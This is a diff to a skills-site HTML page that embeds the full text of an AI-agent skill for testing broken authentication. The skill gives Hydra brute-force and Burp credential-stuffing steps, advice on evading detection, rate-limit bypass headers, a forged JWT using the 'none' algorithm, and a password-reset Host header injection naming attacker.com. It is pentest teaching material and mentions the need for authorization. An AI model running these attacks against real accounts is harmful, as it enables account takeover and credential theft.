@@ -33,20 +33,15 @@
     .desc{font-size:18px;color:#444;margin-bottom:32px;line-height:1.7}
     .section{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px;margin-bottom:24px}
     .section h2{font-size:20px;font-weight:600;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #e5e5e5}
-    .install-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
-    .install-box p{color:#888;font-size:13px;margin-bottom:8px}
-    .install-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
+    .copy-box{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:16px}
+    .copy-box p{color:#888;font-size:13px;margin-bottom:8px}
+    .copy-box code{display:block;color:#4ade80;font-family:'JetBrains Mono',monospace;font-size:14px;word-break:break-all}
     .copy-btn{float:right;padding:8px 16px;background:#fff;color:#1a1a1a;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
     .copy-btn:hover{background:#f5f5f5}
     pre{background:#f8f8f8;border:1px solid #e5e5e5;border-radius:12px;padding:20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.5}
-    .how-to{background:#fff;border:1px solid #e5e5e5;border-radius:16px;padding:28px}
-    .how-to h2{font-size:20px;font-weight:600;margin-bottom:16px}
-    .how-to ol{margin:16px 0;padding-left:24px}
-    .how-to li{margin-bottom:12px;color:#444}
-    .how-to code{background:#f5f5f5;padding:2px 6px;border-radius:4px;font-size:13px}
     .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
     .tag{padding:6px 12px;background:#f5f5f5;border-radius:20px;font-size:12px;color:#666}
-    @media(max-width:768px){.header{flex-direction:column}.install-box code{font-size:12px}}
+    @media(max-width:768px){.header{flex-direction:column}.copy-box code{font-size:12px}}
   </style>
 </head>
 <body>
@@ -83,18 +78,493 @@
     <p class="desc">This skill should be used when the user asks to "test for broken authentication vulnerabilities", "assess session management security", "perform credential stuffing tests", "evaluate password policies", "test for session fixation", or "identify authentication bypass flaws". It provides comprehensive techniques for identifying authentication and session management weaknesses in web applications.</p>
 
     <div class="section">
-      <h2>How to Use</h2>
-      <div class="how-to">
-        <ol>
-          <li><strong>Install via CLI:</strong> Run <code>npx aiccli install skills/broken-authentication</code> in your terminal</li>
-          <li><strong>Manual install:</strong> Copy the configuration below and add it to your project's config</li>
-        </ol>
-        
-        <div class="install-box">
-          <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
-          <p>Installation Command:</p>
-          <code id="install-cmd">npx aiccli install skills/broken-authentication</code>
-        </div>
+      <h2>How to Install</h2>
+      <ol style="margin:16px 0;padding-left:24px;color:#444">
+        <li style="margin-bottom:12px"><strong>Copy the config</strong> - Click the "Copy Config" button below</li>
+        <li style="margin-bottom:12px"><strong>Add to your project</strong> - Paste the code into the appropriate config file</li>
+        <li style="margin-bottom:12px"><strong>Done!</strong> - The component is now available in your AI</li>
+      </ol>
+      
+      <div class="copy-box">
+        <button class="copy-btn" onclick="copyConfig()">Copy Config</button>
+        <p>Configuration (click to copy):</p>
+        <code id="install-cmd">---
+name: Broken Authentication Testing
+description: This skill should be used when the user asks to &quot;test for broken authentication vulnerabilities&quot;, &quot;assess session management security&quot;, &quot;perform credential stuffing tests&quot;, &quot;evaluate password policies&quot;, &quot;test for session fixation&quot;, or &quot;identify authentication bypass flaws&quot;. It provides comprehensive techniques for identifying authentication and session management weaknesses in web applications.
+metadata:
+  author: zebbern
+  version: &quot;1.1&quot;
+---
+
+# Broken Authentication Testing
+
+## Purpose
+
+Identify and exploit authentication and session management vulnerabilities in web applications. Broken authentication consistently ranks in the OWASP Top 10 and can lead to account takeover, identity theft, and unauthorized access to sensitive systems. This skill covers testing methodologies for password policies, session handling, multi-factor authentication, and credential management.
+
+## Prerequisites
+
+### Required Knowledge
+- HTTP protocol and session mechanisms
+- Authentication types (SFA, 2FA, MFA)
+- Cookie and token handling
+- Common authentication frameworks
+
+### Required Tools
+- Burp Suite Professional or Community
+- Hydra or similar brute-force tools
+- Custom wordlists for credential testing
+- Browser developer tools
+
+### Required Access
+- Target application URL
+- Test account credentials
+- Written authorization for testing
+
+## Outputs and Deliverables
+
+1. **Authentication Assessment Report** - Document all identified vulnerabilities
+2. **Credential Testing Results** - Brute-force and dictionary attack outcomes
+3. **Session Security Analysis** - Token randomness and timeout evaluation
+4. **Remediation Recommendations** - Security hardening guidance
+
+## Core Workflow
+
+### Phase 1: Authentication Mechanism Analysis
+
+Understand the application&#039;s authentication architecture:
+
+```
+# Identify authentication type
+- Password-based (forms, basic auth, digest)
+- Token-based (JWT, OAuth, API keys)
+- Certificate-based (mutual TLS)
+- Multi-factor (SMS, TOTP, hardware tokens)
+
+# Map authentication endpoints
+/login, /signin, /authenticate
+/register, /signup
+/forgot-password, /reset-password
+/logout, /signout
+/api/auth/*, /oauth/*
+```
+
+Capture and analyze authentication requests:
+
+```http
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=test&amp;password=test123
+```
+
+### Phase 2: Password Policy Testing
+
+Evaluate password requirements and enforcement:
+
+```bash
+# Test minimum length (a, ab, abcdefgh)
+# Test complexity (password, password1, Password1!)
+# Test common weak passwords (123456, password, qwerty, admin)
+# Test username as password (admin/admin, test/test)
+```
+
+Document policy gaps: Minimum length &lt;8, no complexity, common passwords allowed, username as password.
+
+### Phase 3: Credential Enumeration
+
+Test for username enumeration vulnerabilities:
+
+```bash
+# Compare responses for valid vs invalid usernames
+# Invalid: &quot;Invalid username&quot; vs Valid: &quot;Invalid password&quot;
+# Check timing differences, response codes, registration messages
+```
+
+# Password reset
+&quot;Email sent if account exists&quot; (secure)
+&quot;No account with that email&quot; (leaks info)
+
+# API responses
+{&quot;error&quot;: &quot;user_not_found&quot;}
+{&quot;error&quot;: &quot;invalid_password&quot;}
+```
+
+### Phase 4: Brute Force Testing
+
+Test account lockout and rate limiting:
+
+```bash
+# Using Hydra for form-based auth
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  target.com http-post-form \
+  &quot;/login:username=^USER^&amp;password=^PASS^:Invalid credentials&quot;
+
+# Using Burp Intruder
+1. Capture login request
+2. Send to Intruder
+3. Set payload positions on password field
+4. Load wordlist
+5. Start attack
+6. Analyze response lengths/codes
+```
+
+Check for protections:
+
+```bash
+# Account lockout
+- After how many attempts?
+- Duration of lockout?
+- Lockout notification?
+
+# Rate limiting
+- Requests per minute limit?
+- IP-based or account-based?
+- Bypass via headers (X-Forwarded-For)?
+
+# CAPTCHA
+- After failed attempts?
+- Easily bypassable?
+```
+
+### Phase 5: Credential Stuffing
+
+Test with known breached credentials:
+
+```bash
+# Credential stuffing differs from brute force
+# Uses known email:password pairs from breaches
+
+# Using Burp Intruder with Pitchfork attack
+1. Set username and password as positions
+2. Load email list as payload 1
+3. Load password list as payload 2 (matched pairs)
+4. Analyze for successful logins
+
+# Detection evasion
+- Slow request rate
+- Rotate source IPs
+- Randomize user agents
+- Add delays between attempts
+```
+
+### Phase 6: Session Management Testing
+
+Analyze session token security:
+
+```bash
+# Capture session cookie
+Cookie: SESSIONID=abc123def456
+
+# Test token characteristics
+1. Entropy - Is it random enough?
+2. Length - Sufficient length (128+ bits)?
+3. Predictability - Sequential patterns?
+4. Secure flags - HttpOnly, Secure, SameSite?
+```
+
+Session token analysis:
+
+```python
+#!/usr/bin/env python3
+import requests
+import hashlib
+
+# Collect multiple session tokens
+tokens = []
+for i in range(100):
+    response = requests.get(&quot;https://target.com/login&quot;)
+    token = response.cookies.get(&quot;SESSIONID&quot;)
+    tokens.append(token)
+
+# Analyze for patterns
+# Check for sequential increments
+# Calculate entropy
+# Look for timestamp components
+```
+
+### Phase 7: Session Fixation Testing
+
+Test if session is regenerated after authentication:
+
+```bash
+# Step 1: Get session before login
+GET /login HTTP/1.1
+Response: Set-Cookie: SESSIONID=abc123
+
+# Step 2: Login with same session
+POST /login HTTP/1.1
+Cookie: SESSIONID=abc123
+username=valid&amp;password=valid
+
+# Step 3: Check if session changed
+# VULNERABLE if SESSIONID remains abc123
+# SECURE if new session assigned after login
+```
+
+Attack scenario:
+
+```bash
+# Attacker workflow:
+1. Attacker visits site, gets session: SESSIONID=attacker_session
+2. Attacker sends link to victim with fixed session:
+   https://target.com/login?SESSIONID=attacker_session
+3. Victim logs in with attacker&#039;s session
+4. Attacker now has authenticated session
+```
+
+### Phase 8: Session Timeout Testing
+
+Verify session expiration policies:
+
+```bash
+# Test idle timeout
+1. Login and note session cookie
+2. Wait without activity (15, 30, 60 minutes)
+3. Attempt to use session
+4. Check if session is still valid
+
+# Test absolute timeout
+1. Login and continuously use session
+2. Check if forced logout after set period (8 hours, 24 hours)
+
+# Test logout functionality
+1. Login and note session
+2. Click logout
+3. Attempt to reuse old session cookie
+4. Session should be invalidated server-side
+```
+
+### Phase 9: Multi-Factor Authentication Testing
+
+Assess MFA implementation security:
+
+```bash
+# OTP brute force
+- 4-digit OTP = 10,000 combinations
+- 6-digit OTP = 1,000,000 combinations
+- Test rate limiting on OTP endpoint
+
+# OTP bypass techniques
+- Skip MFA step by direct URL access
+- Modify response to indicate MFA passed
+- Null/empty OTP submission
+- Previous valid OTP reuse
+
+# API Version Downgrade Attack (crAPI example)
+# If /api/v3/check-otp has rate limiting, try older versions:
+POST /api/v2/check-otp
+{&quot;otp&quot;: &quot;1234&quot;}
+# Older API versions may lack security controls
+
+# Using Burp for OTP testing
+1. Capture OTP verification request
+2. Send to Intruder
+3. Set OTP field as payload position
+4. Use numbers payload (0000-9999)
+5. Check for successful bypass
+```
+
+Test MFA enrollment:
+
+```bash
+# Forced enrollment
+- Can MFA be skipped during setup?
+- Can backup codes be accessed without verification?
+
+# Recovery process
+- Can MFA be disabled via email alone?
+- Social engineering potential?
+```
+
+### Phase 10: Password Reset Testing
+
+Analyze password reset security:
+
+```bash
+# Token security
+1. Request password reset
+2. Capture reset link
+3. Analyze token:
+   - Length and randomness
+   - Expiration time
+   - Single-use enforcement
+   - Account binding
+
+# Token manipulation
+https://target.com/reset?token=abc123&amp;user=victim
+# Try changing user parameter while using valid token
+
+# Host header injection
+POST /forgot-password HTTP/1.1
+Host: attacker.com
+email=victim@email.com
+# Reset email may contain attacker&#039;s domain
+```
+
+## Quick Reference
+
+### Common Vulnerability Types
+
+| Vulnerability | Risk | Test Method |
+|--------------|------|-------------|
+| Weak passwords | High | Policy testing, dictionary attack |
+| No lockout | High | Brute force testing |
+| Username enumeration | Medium | Differential response analysis |
+| Session fixation | High | Pre/post-login session comparison |
+| Weak session tokens | High | Entropy analysis |
+| No session timeout | Medium | Long-duration session testing |
+| Insecure password reset | High | Token analysis, workflow bypass |
+| MFA bypass | Critical | Direct access, response manipulation |
+
+### Credential Testing Payloads
+
+```bash
+# Default credentials
+admin:admin
+admin:password
+admin:123456
+root:root
+test:test
+user:user
+
+# Common passwords
+123456
+password
+12345678
+qwerty
+abc123
+password1
+admin123
+
+# Breached credential databases
+- Have I Been Pwned dataset
+- SecLists passwords
+- Custom targeted lists
+```
+
+### Session Cookie Flags
+
+| Flag | Purpose | Vulnerability if Missing |
+|------|---------|------------------------|
+| HttpOnly | Prevent JS access | XSS can steal session |
+| Secure | HTTPS only | Sent over HTTP |
+| SameSite | CSRF protection | Cross-site requests allowed |
+| Path | URL scope | Broader exposure |
+| Domain | Domain scope | Subdomain access |
+| Expires | Lifetime | Persistent sessions |
+
+### Rate Limiting Bypass Headers
+
+```http
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+```
+
+## Constraints and Limitations
+
+### Legal Requirements
+- Only test with explicit written authorization
+- Avoid testing with real breached credentials
+- Do not access actual user accounts
+- Document all testing activities
+
+### Technical Limitations
+- CAPTCHA may prevent automated testing
+- Rate limiting affects brute force timing
+- MFA significantly increases attack difficulty
+- Some vulnerabilities require victim interaction
+
+### Scope Considerations
+- Test accounts may behave differently than production
+- Some features may be disabled in test environments
+- Third-party authentication may be out of scope
+- Production testing requires extra caution
+
+## Examples
+
+### Example 1: Account Lockout Bypass
+
+**Scenario:** Test if account lockout can be bypassed
+
+```bash
+# Step 1: Identify lockout threshold
+# Try 5 wrong passwords for admin account
+# Result: &quot;Account locked for 30 minutes&quot;
+
+# Step 2: Test bypass via IP rotation
+# Use X-Forwarded-For header
+POST /login HTTP/1.1
+X-Forwarded-For: 192.168.1.1
+username=admin&amp;password=attempt1
+
+# Increment IP for each attempt
+X-Forwarded-For: 192.168.1.2
+# Continue until successful or confirmed blocked
+
+# Step 3: Test bypass via case manipulation
+username=Admin (vs admin)
+username=ADMIN
+# Some systems treat these as different accounts
+```
+
+### Example 2: JWT Token Attack
+
+**Scenario:** Exploit weak JWT implementation
+
+```bash
+# Step 1: Capture JWT token
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.signature
+
+# Step 2: Decode and analyze
+# Header: {&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+# Payload: {&quot;user&quot;:&quot;test&quot;,&quot;role&quot;:&quot;user&quot;}
+
+# Step 3: Try &quot;none&quot; algorithm attack
+# Change header to: {&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}
+# Remove signature
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+
+# Step 4: Submit modified token
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+```
+
+### Example 3: Password Reset Token Exploitation
+
+**Scenario:** Test password reset functionality
+
+```bash
+# Step 1: Request reset for test account
+POST /forgot-password
+email=test@example.com
+
+# Step 2: Capture reset link
+https://target.com/reset?token=a1b2c3d4e5f6
+
+# Step 3: Test token properties
+# Reuse: Try using same token twice
+# Expiration: Wait 24+ hours and retry
+# Modification: Change characters in token
+
+# Step 4: Test for user parameter manipulation
+https://target.com/reset?token=a1b2c3d4e5f6&amp;email=admin@example.com
+# Check if admin&#039;s password can be reset with test user&#039;s token
+```
+
+## Troubleshooting
+
+| Issue | Solutions |
+|-------|-----------|
+| Brute force too slow | Identify rate limit scope; IP rotation; add delays; use targeted wordlists |
+| Session analysis inconclusive | Collect 1000+ tokens; use statistical tools; check for timestamps; compare accounts |
+| MFA cannot be bypassed | Document as secure; test backup/recovery mechanisms; check MFA fatigue; verify enrollment |
+| Account lockout prevents testing | Request multiple test accounts; test threshold first; use slower timing |
+</code>
       </div>
     </div>
 
